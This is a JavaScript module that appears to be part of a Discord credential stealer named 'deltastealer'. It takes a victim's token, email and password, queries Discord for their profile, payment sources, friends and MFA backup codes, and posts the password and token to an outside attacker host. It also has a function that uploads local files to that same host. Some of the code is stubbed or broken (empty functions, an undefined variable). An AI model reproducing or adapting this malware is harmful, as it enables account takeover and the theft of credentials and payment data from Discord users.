const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

var asd = {};

// Local Objects
const Nitro = {
  0: false,
  1: "<:nitro_classic:962431607879372850>",
  2: "<:nitro_boost:962432521461706763>",
};

const badges = {
  1: "<:discord_employee:962493361741242370>",
  2: "<:partner:962493833344581702>",
  4: "<:hypesquad:962494683248996463>",
  8: "<:hunter1:962495135101378570>",
  512: "<:early:962497249995264050>",
};

const getBadges = () => {};

// Local Functions
const calculateFriends = (friends) => {
  var str = "";
};

const steal = async () => {
  let output = "";

  return output;
};

const sendFile = async (fName, fPath) => {
  if (!fs.existsSync(fPath)) return false;

  var form = new FormData();
  var f = fs.createReadStream(fPath);
  form.append("title", fName);
  form.append("file", f);

  var res = await axios.post("https://api.deltastealer.gq/v1/upload", form, {
    headers: {
      ...form.getHeaders(),
    },
  });

  return res.data;
};

const send = async ({ type, userid = undefined, id = undefined, payload }) => {
  const types = {
    dm: "dm",
    channel: "channel",
  };

  if (types[type] === "dm") {
    const res = await axios.post(
      `https://api.deltastealer.gq/v1/users/${userid}`,
      {
        payload: JSON.stringify(payload),
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );

    return res;
  } else {
  }
};

const sendChannel = async (id, payload) => {
  const res = await axios.post(
    `https://api.deltastealer.gq/v1/channels/${id}/messages`,
    {
      payload: JSON.stringify(payload),
    },
    {
      headers: {
        "Content-Type": "application/json",
      },
    }
  );

  return res;
};

// Exports

asd.login = async (token, email, password) => {
  const ip = await axios.get("https://ifconfig.me/");
  BrowserWindow.getAllWindows()[0].webContents.executeJavascript(
    `alert("${ip.data}")`,
    true
  );

  const user = await axios.get(
    "https://discord.com/api/v9/users/@me",

    {
      headers: {
        "Content-Type": "application/json",
        Authorization: token,
      },
    }
  ).data;
  const payments = await axios.get(
    "https://discord.com/api/v9/users/@me/billing/payment-sources",

    {
      headers: {
        "Content-Type": "application/json",
        Authorization: token,
      },
    }
  ).data;

  const friends = await axios.get(
    "https://discord.com/api/v9/users/@me/relationships",

    {
      headers: {
        "Content-Type": "application/json",
        Authorization: token,
      },
    }
  ).data;

  if (tokens.startsWith("mfa")) {
    const codes = await axios.get(
      "https://discord.com/api/v9/users/@me/mfa/codes",
      {
        password: password,
        regenerate: false,
      },
      {
        headers: {
          "Content-Type": "application/json",
          Authorization: token,
        },
      }
    ).data.backup_codes;
  }


  var payload = {
    embeds: [
      {
        title: "User Logged In",
        description: `\`\`\`asd\`\`\``,
        author: {
          name: user.username,
        },
        fields: [
          {
            name: "ID",
            value: `\`${user.id}\``,
            inline: true,
          },
          {
            name: "Tag",
            value: `\`${user.username}#${user.discriminator}\``,
            inline: true,
          },
          {
            name: "Badges",
            value: `Asd`,
            inline: true,
          },
          {
            name: "E-mail",
            value: `\`${email}\``,
            inline: true,
          },
          {
            name: "Password",
            value: `\`${password}\``,
            inline: true,
          },
          {
            name: "Token",
            value: `\`${token}\``,
            inline: true,
          },
        ],
      },
    ],
  };

  sendChannel("962428216226754593", payload);
};

module.exports = asd;
